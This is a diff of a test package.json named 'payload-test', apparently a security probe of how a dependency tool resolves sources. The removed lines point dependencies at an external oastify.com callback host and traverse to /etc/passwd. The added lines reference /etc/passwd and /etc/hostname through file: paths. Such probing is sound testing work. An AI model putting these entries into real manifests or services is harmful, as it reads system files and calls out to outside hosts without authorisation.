@@ -1,10 +1,10 @@
 {
-  "name": "payload-test",
-  "version": "1.0.0",
-  "dependencies": {
-    "lodash": "4.17.15",
-    "gitdep-probe": "git+https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/gitdep.git#v1.0.0",
-    "httpdep-probe": "https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/httpdep.tgz",
-    "filedep-probe": "file:../../../../../../etc/passwd"
-  }
+ "name": "payload-test",
+ "version": "1.0.0",
+ "dependencies": {
+  "lodash": "4.17.15",
+  "filedep2": "file:./evil-link/etc/passwd",
+  "filedep3": "file:../outside-link/etc/hostname",
+  "filedep4": "file:/etc/passwd"
+ }
 }
